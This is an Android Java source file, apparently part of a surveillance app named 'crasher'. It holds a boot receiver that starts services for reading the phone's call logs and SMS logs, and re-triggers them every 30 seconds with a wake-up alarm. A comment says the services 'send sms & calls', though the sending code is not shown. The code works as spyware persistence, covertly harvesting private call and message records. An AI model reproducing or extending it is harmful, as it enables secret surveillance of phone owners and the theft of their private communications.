package com.bigeye.crasher;

import java.util.Calendar;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

public class ScheduleReceiver extends BroadcastReceiver {

	//restart service every 30 secs
	private static final long REPEAT_TIME = 1000 * 30;
	private final String APP_TAG = getClass().getSimpleName();
	
	@Override
	public void onReceive(final Context context, Intent intent) {
		
		Log.i(APP_TAG, "Alright! woken up by BOOT_COMPLETED OP");
		
		//start services to send sms & calls
		//start call log service
		context.startService(new Intent(context, ReadCallLogs.class));
		
		//start read sms log service
		context.startService(new Intent(context, ReadSMSLogs.class));
		
		AlarmManager service = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
		Intent i = new Intent(context, StartServiceReceiver.class);
		PendingIntent pending = PendingIntent.getBroadcast(context, 0, i, PendingIntent.FLAG_CANCEL_CURRENT);
		Calendar cal = Calendar.getInstance();
		
		//start 30secs after boot completed
		cal.add(Calendar.SECOND, 30);
		
		//fetch every 30 secs
		service.setInexactRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), REPEAT_TIME, pending);
		
	}

}
